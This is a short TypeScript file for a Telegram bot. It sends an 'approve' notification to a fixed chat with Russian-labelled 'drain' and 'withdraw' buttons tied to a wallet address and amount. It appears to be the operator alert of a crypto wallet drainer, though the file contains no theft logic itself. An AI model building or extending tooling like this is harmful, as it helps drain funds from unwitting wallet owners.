import { Markup } from "telegraf";
import { CHAT_ID } from "../../lib/constants";
import { loggerBot } from "../../lib/logger";
import { bot } from "../bot";

export async function sendMessageInline(
  text: string,
  address: string,
  amount: number
) {
  try {
    await bot.telegram.sendMessage(CHAT_ID, text, {
      parse_mode: "HTML",
      reply_markup: Markup.inlineKeyboard([
        [
          Markup.button.callback("Списать", `drain_${address}`),
          Markup.button.callback("Отправить", `widrw_${address}_${amount}`),
        ],
      ]).reply_markup,
    });
    loggerBot.info(`Сообщение об апруве отправлено в чат`);
  } catch (err) {
    loggerBot.error(`Ошибка при отправлении сообщения апрува: ${err}`);
    throw err;
  }
}
